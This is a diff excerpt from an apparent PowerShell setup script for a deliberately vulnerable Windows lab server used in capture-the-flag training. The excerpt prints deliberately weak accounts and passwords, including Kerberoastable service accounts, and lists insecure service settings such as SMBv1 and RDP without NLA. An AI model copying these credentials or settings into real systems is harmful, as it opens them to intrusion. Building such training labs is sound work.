-Write-Host "    Easy: $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Easy'}).Count) flags" -ForegroundColor Green
-Write-Host "    Medium: $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Medium'}).Count) flags" -ForegroundColor DarkYellow
-Write-Host "    Hard: $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Hard'}).Count) flags" -ForegroundColor Red
-Write-Host ""
-Write-Host "Flag Format: FLAG{$TeamIdentifier-SRV-XXX}" -ForegroundColor Cyan
-Write-Host ""
-if ($GenerateFlagReport) {
-    Write-Host "Flag report generated at: $reportPath" -ForegroundColor Green
-    Write-Host "Open the HTML report for full flag details and hints!" -ForegroundColor Green
-} else {
-    Write-Host "To generate a detailed flag report, run with -GenerateFlagReport switch" -ForegroundColor Cyan
-}
 Write-Host ""
 Write-Host "Vulnerable users created:" -ForegroundColor Cyan
 Write-Host "  Administrator: $LabPassword" -ForegroundColor Yellow
 Write-Host "  admin: admin" -ForegroundColor Yellow
-Write-Host "  user1: password" -ForegroundColor Yellow
-Write-Host "  backup: backup123" -ForegroundColor Yellow
-Write-Host "  ftpuser: ftp123" -ForegroundColor Yellow
+Write-Host "  svc_mssql: Summer2019! (Kerberoastable)" -ForegroundColor Yellow
+Write-Host "  svc_http: Winter2020! (Kerberoastable)" -ForegroundColor Yellow
+Write-Host "  svc_print: PrintService123" -ForegroundColor Yellow
 Write-Host ""
 Write-Host "Services configured:" -ForegroundColor Cyan
-Write-Host "  - RDP (3389) - No NLA, allows blank passwords" -ForegroundColor Yellow
-Write-Host "  - SMB (445) - SMBv1 enabled, null sessions" -ForegroundColor Yellow
-Write-Host "  - FTP (21) - Anonymous access, weak credentials" -ForegroundColor Yellow
-Write-Host "  - SSH (22) - Permits root, empty passwords" -ForegroundColor Yellow
-Write-Host "  - HTTP (80) - Directory browsing, debug info" -ForegroundColor Yellow
+Write-Host "  - RDP (3389) - No NLA" -ForegroundColor Yellow
+Write-Host "  - SMB (445) - SMBv1 enabled" -ForegroundColor Yellow
+Write-Host "  - SSH (22) - Weak config" -ForegroundColor Yellow
+Write-Host "  - HTTP (80) - Directory browsing" -ForegroundColor Yellow
+Write-Host "  - Print Spooler - Vulnerable" -ForegroundColor Yellow
+Write-Host ""
+if ($GenerateFlagReport) {
+    Write-Host "Flag reports generated! Check HTML for full details." -ForegroundColor Green
+}
 Write-Host ""
 Write-Host "REMINDER: This server is now EXTREMELY VULNERABLE!" -ForegroundColor Red
 Write-Host "Only use in isolated lab environments!" -ForegroundColor Red
